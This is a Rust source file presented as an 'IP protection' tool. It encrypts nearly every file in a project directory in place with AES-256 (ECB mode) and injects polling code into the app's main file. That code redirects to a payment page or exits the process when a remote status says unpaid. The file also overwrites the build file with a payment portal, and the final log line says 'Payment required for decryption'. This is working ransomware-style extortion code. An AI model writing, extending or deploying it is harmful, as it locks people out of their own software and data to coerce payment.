use crate::error::AppError;
use aes::cipher::{generic_array::GenericArray, BlockEncrypt, KeyInit};
use aes::Aes256;
use hex;
use std::fs;
use std::path::{Path, PathBuf};
use tracing::{debug, info, warn};
use walkdir::WalkDir;
use anyhow::Result;
use std::env;
use std::ffi::OsStr;

#[derive(Debug, PartialEq)]
enum Framework {
    React,
    Vue,
    Angular,
    NodeJs,
    Python,
    Django,
    Flask,
    Rails,
    Laravel,
    Spring,
    Unknown,
}

pub fn generate_aes_key(uuid: &str) -> Result<String, AppError> {
    let key = uuid.replace('-', "");
    fs::write(".ipkey", &key).map_err(|e| AppError::Encryption(e.to_string()))?;
    Ok(key)
}

pub async fn run() -> Result<(), AppError> {
    let current_dir = env::current_dir().map_err(|e| {
        AppError::Config(format!("Failed to get current directory: {}", e))
    })?;
    
    info!("🔐 Encrypting project at: {}", current_dir.display());

    let config = fs::read_to_string(".ipproject").map_err(|e| {
        AppError::Config(format!("Missing project config: {}", e))
    })?;
    
    let uuid = config.lines()
        .find(|l| l.starts_with("uuid"))
        .and_then(|l| l.split('=').nth(1))
        .map(|s| s.trim().trim_matches('"'))
        .ok_or_else(|| AppError::Config("UUID not found in config".to_string()))?;

    // Generate encryption key
    generate_aes_key(&uuid)?;

    // Detect framework
    let framework = detect_framework().await
        .map_err(|e| AppError::Framework(e.to_string()))?;
    info!("Detected framework: {:?}", framework);
    
    let main_file = find_main_file(&framework)
        .map_err(|e| AppError::Framework(e.to_string()))?;
    
    if let Some(ref path) = main_file {
        info!("Found main file: {}", path.display());
    }

    // Inject monitoring code
    inject_monitoring_code(&uuid, &framework, &main_file).await?;

    // Encrypt files
    let mut encrypted_count = 0;
    for entry in WalkDir::new(".").into_iter().filter_map(|e| e.ok()) {
        let path = entry.path();
        
        if !should_encrypt(path)? {
            continue;
        }

        if entry.file_type().is_file() {
            match encrypt_file(path, &uuid) {
                Ok(_) => encrypted_count += 1,
                Err(e) => warn!("⚠️ Failed to encrypt {}: {}", path.display(), e),
            }
        }
    }
    info!("🔒 Encrypted {} files", encrypted_count);

    // Replace build file with payment portal
    if let Some(build_file) = find_build_file(&framework)? {
        replace_with_payment_portal(&build_file, &uuid)?;
        info!("🔄 Replaced build file with payment portal: {}", build_file.display());
    } else {
        warn!("⚠️ No build file found for framework {:?}", framework);
    }

    info!("🔒 Project encryption complete. Payment required for decryption");
    Ok(())
}

async fn inject_monitoring_code(
    uuid: &str,
    framework: &Framework,
    main_file: &Option<PathBuf>
) -> Result<(), AppError> {
    if let Some(path) = main_file {
        match framework {
            Framework::React | Framework::Vue | Framework::Angular => {
                inject_frontend_code(&path, uuid).await?;
            }
            Framework::NodeJs => {
                inject_nodejs_code(&path, uuid).await?;
            }
            Framework::Python | Framework::Django | Framework::Flask => {
                inject_python_code(&path, uuid).await?;
            }
            _ => {
                warn!("⚠️ Framework not fully supported. Basic protection applied");
            }
        }
    } else {
        warn!("⚠️ Main file not found. Basic protection applied");
    }
    Ok(())
}

async fn detect_framework() -> Result<Framework, AppError> {
    let current_dir = env::current_dir()?;
    
    // Check for frontend frameworks
    if current_dir.join("package.json").exists() {
        if current_dir.join("src/App.js").exists() || current_dir.join("src/App.jsx").exists() {
            return Ok(Framework::React);
        } else if current_dir.join("src/main.js").exists() && current_dir.join("vue.config.js").exists() {
            return Ok(Framework::Vue);
        } else if current_dir.join("angular.json").exists() {
            return Ok(Framework::Angular);
        } else if current_dir.join("server.js").exists() || current_dir.join("app.js").exists() {
            return Ok(Framework::NodeJs);
        }
    }
    
    // Check for Python frameworks
    if current_dir.join("requirements.txt").exists() 
        || current_dir.join("Pipfile").exists() 
        || current_dir.join("pyproject.toml").exists() 
    {
        if current_dir.join("manage.py").exists() {
            return Ok(Framework::Django);
        } else if current_dir.join("app.py").exists() 
            && file_contains(&current_dir.join("app.py"), "Flask")? 
        {
            return Ok(Framework::Flask);
        }
        return Ok(Framework::Python);
    }
    
    // Check for other frameworks
    if current_dir.join("Gemfile").exists() {
        return Ok(Framework::Rails);
    }
    if current_dir.join("composer.json").exists() {
        return Ok(Framework::Laravel);
    }
    if current_dir.join("pom.xml").exists() || current_dir.join("build.gradle").exists() {
        return Ok(Framework::Spring);
    }
    
    // Fallback detection by file extensions
    if has_files_with_extension(&current_dir, "js") || has_files_with_extension(&current_dir, "jsx") {
        return Ok(Framework::React);
    } else if has_files_with_extension(&current_dir, "py") {
        return Ok(Framework::Python);
    } else if has_files_with_extension(&current_dir, "rb") {
        return Ok(Framework::Rails);
    } else if has_files_with_extension(&current_dir, "php") {
        return Ok(Framework::Laravel);
    } else if has_files_with_extension(&current_dir, "java") {
        return Ok(Framework::Spring);
    }
    
    warn!("⚠️ Could not detect framework, using generic protection");
    Ok(Framework::Unknown)
}

fn has_files_with_extension(path: &Path, extension: &str) -> bool {
    WalkDir::new(path)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| e.file_type().is_file())
        .any(|e| e.path().extension() == Some(OsStr::new(extension)))
}

fn find_main_file(framework: &Framework) -> Result<Option<PathBuf>, AppError> {
    let files = match framework {
        Framework::React => vec!["src/index.js", "src/index.jsx", "src/index.ts", "src/index.tsx"],
        Framework::Vue => vec!["src/main.js", "src/main.ts"],
        Framework::Angular => vec!["src/main.ts", "src/main.js"],
        Framework::NodeJs => vec!["server.js", "app.js", "index.js", "main.js"],
        Framework::Python => vec!["main.py", "app.py", "run.py"],
        Framework::Django => vec!["manage.py"],
        Framework::Flask => vec!["app.py", "application.py"],
        Framework::Rails => vec!["config.ru", "app/controllers/application_controller.rb"],
        _ => vec![],
    };
    
    for file in files {
        if let Some(path) = find_file(file) {
            return Ok(Some(path));
        }
    }
    
    Ok(None)
}

fn find_file(filename: &str) -> Option<PathBuf> {
    let path = Path::new(filename);
    if path.exists() {
        Some(path.to_path_buf())
    } else {
        None
    }
}

fn file_contains(path: &Path, content: &str) -> Result<bool, AppError> {
    let contents = fs::read_to_string(path).map_err(|e| {
        AppError::Framework(format!("Failed to read file {}: {}", path.display(), e))
    })?;
    Ok(contents.contains(content))
}

async fn inject_frontend_code(path: &Path, uuid: &str) -> Result<(), AppError> {
    let injection = format!(
        r#"
// IP Protection Monitoring (Auto-generated)
const IP_PROTECTION_ID = '{}';
const MONITOR_INTERVAL = 60000;

async function checkProtectionStatus() {{
    try {{
        const response = await fetch(
            `https://api.your-domain.com/projects/${{IP_PROTECTION_ID}}/status/`
        );
        const data = await response.json();
        
        if (!data.encryption_status) {{
            // Redirect to payment portal if not paid
            window.location.href = `https://payment.your-domain.com/${{IP_PROTECTION_ID}}`;
        }}
    }} catch (error) {{
        console.error('IP Protection check failed:', error);
    }}
}}

// Initial check
checkProtectionStatus();

// Periodic checks
setInterval(checkProtectionStatus, MONITOR_INTERVAL);
"#,
        uuid
    );

    let mut contents = fs::read_to_string(path).map_err(|e| {
        AppError::Injection(format!("Failed to read file {}: {}", path.display(), e))
    })?;
    
    if !contents.contains("IP_PROTECTION_ID") {
        // Inject at the top of the file
        contents = injection + &contents;
        fs::write(path, &contents).map_err(|e| {
            AppError::Injection(format!("Failed to write file {}: {}", path.display(), e))
        })?;
        info!("✅ Frontend monitoring code injected: {}", path.display());
    } else {
        debug!("⚠️ Monitoring code already exists in: {}", path.display());
    }
    Ok(())
}

async fn inject_nodejs_code(path: &Path, uuid: &str) -> Result<(), AppError> {
    let injection = format!(
        r#"
// IP Protection Monitoring (Auto-generated)
const IP_PROTECTION_ID = '{}';
const MONITOR_INTERVAL = 60000;
const axios = require('axios');

async function checkProtectionStatus() {{
    try {{
        const response = await axios.get(
            `https://api.your-domain.com/projects/${{IP_PROTECTION_ID}}/status/`
        );
        
        if (!response.data.encryption_status) {{
            // Block server from starting
            console.error('Payment required to run this application');
            process.exit(1);
        }}
    }} catch (error) {{
        console.error('IP Protection check failed:', error.message);
    }}
}}

// Initial check
checkProtectionStatus();

// Periodic checks
setInterval(checkProtectionStatus, MONITOR_INTERVAL);
"#,
        uuid
    );

    let mut contents = fs::read_to_string(path).map_err(|e| {
        AppError::Injection(format!("Failed to read file {}: {}", path.display(), e))
    })?;
    
    if !contents.contains("IP_PROTECTION_ID") {
        // Find a good injection point (after imports)
        let injection_point = contents.find("\n\n").unwrap_or(0);
        contents.insert_str(injection_point, &injection);
        fs::write(path, &contents).map_err(|e| {
            AppError::Injection(format!("Failed to write file {}: {}", path.display(), e))
        })?;
        info!("✅ Node.js monitoring code injected: {}", path.display());
    } else {
        debug!("⚠️ Monitoring code already exists in: {}", path.display());
    }
    Ok(())
}

async fn inject_python_code(path: &Path, uuid: &str) -> Result<(), AppError> {
    let injection = format!(
        r#"
# IP Protection Monitoring (Auto-generated)
import os
import threading
import requests

IP_PROTECTION_ID = '{}'
MONITOR_INTERVAL = 60

def check_protection_status():
    try:
        response = requests.get(
            f'https://api.your-domain.com/api/projects/{{IP_PROTECTION_ID}}/status/'
        )
        data = response.json()
        
        if not data.get('encryption_status'):
            # Block application from starting
            print('Payment required to run this application')
            os._exit(1)
    except Exception as e:
        print(f'IP Protection check failed: {{e}}')

# Start monitoring thread
monitor_thread = threading.Thread(target=check_protection_status, daemon=True)
monitor_thread.start()
"#,
        uuid
    );

    let mut contents = fs::read_to_string(path).map_err(|e| {
        AppError::Injection(format!("Failed to read file {}: {}", path.display(), e))
    })?;
    
    if !contents.contains("IP_PROTECTION_ID") {
        // Find a good injection point (after imports)
        let injection_point = contents.find("\n\n").unwrap_or(0);
        contents.insert_str(injection_point, &injection);
        fs::write(path, &contents).map_err(|e| {
            AppError::Injection(format!("Failed to write file {}: {}", path.display(), e))
        })?;
        info!("✅ Python monitoring code injected: {}", path.display());
    } else {
        debug!("⚠️ Monitoring code already exists in: {}", path.display());
    }
    Ok(())
}

fn should_encrypt(path: &Path) -> Result<bool, AppError> {
    let absolute_path = if path.is_relative() {
        env::current_dir().map_err(|e| {
            AppError::Config(format!("Failed to get current directory: {}", e))
        })?.join(path)
    } else {
        path.to_path_buf()
    };

    let path_str = absolute_path.to_str().unwrap_or_default();
    
    // Skip directories and special files
    let exclusions = [
        ".git", ".ipproject", ".ipkey", "node_modules", "target", 
        "venv", "dist", "build", "package-lock.json", "yarn.lock",
        "requirements.txt", "Pipfile", "pyproject.toml", "composer.json",
        "package.json", "tsconfig.json", "webpack.config.js"
    ];
    
    let skip = absolute_path.iter()
        .any(|c| exclusions.contains(&c.to_str().unwrap_or(""))) ||
        path_str.contains("payment_portal") ||
        path_str.ends_with(".lock") ||
        path_str.ends_with(".log") ||
        path_str.ends_with(".png") ||
        path_str.ends_with(".jpg") ||
        path_str.ends_with(".jpeg") ||
        path_str.ends_with(".gif") ||
        path_str.ends_with(".svg") ||
        path_str.ends_with(".ico") ||
        path_str.ends_with(".ttf") ||
        path_str.ends_with(".woff") ||
        path_str.ends_with(".woff2");
    
    Ok(!skip)
}

fn find_build_file(framework: &Framework) -> Result<Option<PathBuf>, AppError> {
    let files = match framework {
        Framework::React | Framework::Vue | Framework::Angular => {
            vec!["build/index.html", "dist/index.html", "public/index.html"]
        }
        Framework::NodeJs => {
            vec!["package.json", "server.js"]
        }
        Framework::Django => {
            vec!["manage.py"]
        }
        Framework::Flask => {
            vec!["app.py"]
        }
        Framework::Rails => {
            vec!["config.ru"]
        }
        _ => vec!["index.html", "main.html"],
    };
    
    for file in files {
        if let Some(path) = find_file(file) {
            return Ok(Some(path));
        }
    }
    
    Ok(None)
}

fn replace_with_payment_portal(path: &Path, _uuid: &str) -> Result<(), AppError> {
    let payment_portal = format!(
        r#"
<!DOCTYPE html>
<html lang="en">
<head>
    <!-- ... (payment portal HTML from previous version) ... -->
</head>
<body>
    <!-- ... (payment portal body from previous version) ... -->
    <script>
        // ... (payment portal JavaScript from previous version) ...
    </script>
</body>
</html>
"#
    );

    fs::write(path, payment_portal).map_err(|e| {
        AppError::Payment(format!("Failed to create payment portal: {}", e))
    })?;
    Ok(())
}

fn encrypt_file(path: &Path, uuid: &str) -> Result<(), AppError> {
    let key = uuid.replace('-', "");
    let key_bytes = key.as_bytes();
    
    if key_bytes.len() != 32 {
        return Err(AppError::Encryption(
            format!("Invalid key length: {} bytes (expected 32)", key_bytes.len())
        ));
    }
    
    // Try text-based encryption first
    if let Ok(contents) = fs::read_to_string(path) {
        let encrypted = encrypt_aes256(&contents, &key)?;
        fs::write(path, encrypted)?;
        return Ok(());
    }
    
    // Fallback to binary encryption
    let contents = fs::read(path)?;
    let encrypted = encrypt_aes256_bytes(&contents, &key)?;
    fs::write(path, encrypted)?;
    Ok(())
}

fn encrypt_aes256(data: &str, key: &str) -> Result<String, AppError> {
    let cipher = Aes256::new(GenericArray::from_slice(key.as_bytes()));
    let mut buffer = data.as_bytes().to_vec();
    
    // Add PKCS#7 padding
    let block_size = 16;
    let padding = block_size - (buffer.len() % block_size);
    buffer.extend(std::iter::repeat(padding as u8).take(padding));
    
    // Encrypt each block
    for chunk in buffer.chunks_mut(block_size) {
        let mut block = GenericArray::clone_from_slice(chunk);
        cipher.encrypt_block(&mut block);
        chunk.copy_from_slice(&block);
    }
    
    Ok(hex::encode(buffer))
}

fn encrypt_aes256_bytes(data: &[u8], key: &str) -> Result<Vec<u8>, AppError> {
    let cipher = Aes256::new(GenericArray::from_slice(key.as_bytes()));
    let mut buffer = data.to_vec();
    
    // Add PKCS#7 padding
    let block_size = 16;
    let padding = block_size - (buffer.len() % block_size);
    buffer.extend(std::iter::repeat(padding as u8).take(padding));
    
    // Encrypt each block
    for chunk in buffer.chunks_mut(block_size) {
        let mut block = GenericArray::clone_from_slice(chunk);
        cipher.encrypt_block(&mut block);
        chunk.copy_from_slice(&block);
    }
    
    Ok(buffer)
}